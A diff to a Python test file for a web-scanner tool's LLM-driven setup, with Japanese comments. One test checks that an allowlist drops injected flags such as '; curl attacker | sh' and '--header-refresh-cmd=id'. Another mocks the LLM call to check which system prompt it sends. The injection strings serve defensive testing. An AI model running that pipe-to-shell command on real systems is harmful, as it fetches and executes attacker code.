@@ -63,11 +63,49 @@ def test_flags_allowlist_only_safe_toggles():
     # 注入・値がシェル実行される option・任意の値付き option を排除（#170 P2）。
     out = _parse_setup_llm(
         '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", '
-        '"--header-refresh-cmd=id", "--llm=claude", "--no-headless", "--fast", "--spa-crawl"]}',
+        '"--header-refresh-cmd=id", "--llm=claude", "--no-headless", "--fast", '
+        '"--all-checks", "--spa-crawl"]}',
         KNOWN,
     )
-    # 許可リスト外（注入/値付き/scan に無い --no-headless/depth と食い違う --fast）は全て落とす
+    # 許可リスト外（注入/値付き/scan非対応 --no-headless/depth食い違い --fast/checks上書き --all-checks）は全落とし
     assert out["flags"] == ["--dom-xss", "--spa-crawl"]
+
+
+def test_call_llm_uses_provided_system(monkeypatch):
+    """setup は _SYSTEM_PROMPT ではなく setup 用 system を渡すこと（#170 P2）。"""
+    import asyncio
+    import types
+    import httpx
+    from wscan import auto_config
+
+    captured = {}
+
+    class _Resp:
+        status_code = 200
+
+        def json(self):
+            return {"response": "ok"}
+
+    class _Client:
+        def __init__(self, *a, **k):
+            pass
+
+        async def __aenter__(self):
+            return self
+
+        async def __aexit__(self, *a):
+            return False
+
+        async def post(self, url, json=None):
+            captured["prompt"] = json.get("prompt")
+            return _Resp()
+
+    monkeypatch.setattr(httpx, "AsyncClient", _Client)
+    pg = types.SimpleNamespace(provider="ollama", ollama_url="http://x", ollama_model="m")
+    out = asyncio.run(auto_config._call_llm(pg, "USERPROMPT", system="SETUPSYS"))
+    assert out == "ok"
+    assert captured["prompt"].startswith("SETUPSYS")   # 渡した system が使われる
+    assert "WScan" not in captured["prompt"]            # 既定 _SYSTEM_PROMPT ではない
 
 
 def test_safe_setup_flags_all_exist_on_scan_parser():
